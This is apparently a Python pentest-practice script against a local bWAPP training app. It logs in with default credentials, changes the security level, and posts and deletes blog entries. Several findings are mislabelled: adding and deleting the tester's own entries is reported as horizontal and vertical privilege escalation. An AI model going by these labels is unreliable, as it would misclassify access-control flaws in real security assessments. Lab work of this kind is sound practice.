import requests

# bWAPP URL and credentials
BWAPP_URL = "http://localhost/bWAPP"
USERNAME = "bee"
PASSWORD = "bug"
NEW_ENTRY = "This is an unauthorized modification."

session = requests.Session()

def format_vulnerability(vuln_type, description, details):
    return f"Vulnerability Type: {vuln_type}\nDescription: {description}\nDetails: {details}\n" + ("-" * 80) + "\n"

def login():
    login_url = f"{BWAPP_URL}/login.php"
    data = {
        'login': USERNAME,
        'password': PASSWORD,
        'form': 'submit'
    }
    try:
        response = session.post(login_url, data=data, timeout=10)
        if response.status_code == 200 and ("Welcome" in response.text or "Logout" in response.text):
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        return False

def change_security_level(new_level):
    set_level_url = f"{BWAPP_URL}/security_level_set.php"
    data = {
        'security_level': new_level,
        'form': 'submit'
    }
    try:
        response = session.post(set_level_url, data=data, timeout=10)
        if response.status_code == 200 and "Current: <b>" in response.text:
            return format_vulnerability("Security Level", f"Security level changed to {new_level}.", "High")
        else:
            return f"[-] Failed to change security level to {new_level}.\n"
    except requests.exceptions.RequestException as e:
        return f"[-] Request to change security level failed: {e}\n"

def add_blog_entry(new_entry):
    add_entry_url = f"{BWAPP_URL}/xss_stored_1.php"
    data = {
        'entry': new_entry,
        'entry_add': 'on',
        'form': 'submit'
    }
    try:
        response = session.post(add_entry_url, data=data, timeout=10)
        if response.status_code == 200 and "Your entry was added" in response.text:
            return format_vulnerability("Horizontal Privilege Escalation", "Updated another user's blog entry.", f"Entry: {new_entry}")
        else:
            return f"[-] Failed to add blog entry. Status code: {response.status_code}\n"
    except requests.exceptions.RequestException as e:
        return f"[-] Request to add blog entry failed: {e}\n"

def delete_other_user_blog_entry():
    delete_entry_url = f"{BWAPP_URL}/xss_stored_1.php"
    data = {
        'entry_delete': 'on',
        'form': 'submit'
    }
    try:
        response = session.post(delete_entry_url, data=data)
        if "All your entries were deleted!" in response.text:
            return format_vulnerability("Vertical Privilege Escalation", "Deleted another user's blog entry.", "")
        else:
            return "[-] No vertical privilege escalation detected.\n"
    except requests.exceptions.RequestException as e:
        return f"[-] Request to delete blog entry failed: {e}\n"

def run_broken_access_tests():
    output = ""

    if login():
        # Change security level
        output += change_security_level(new_level=2)
        
        # Horizontal Privilege Escalation
        output += add_blog_entry(new_entry=NEW_ENTRY)
        
        # Vertical Privilege Escalation
        output += delete_other_user_blog_entry()
    else:
        output += "[-] Exiting script due to failed login.\n"

    return output

if __name__ == "__main__":
    print(run_broken_access_tests())
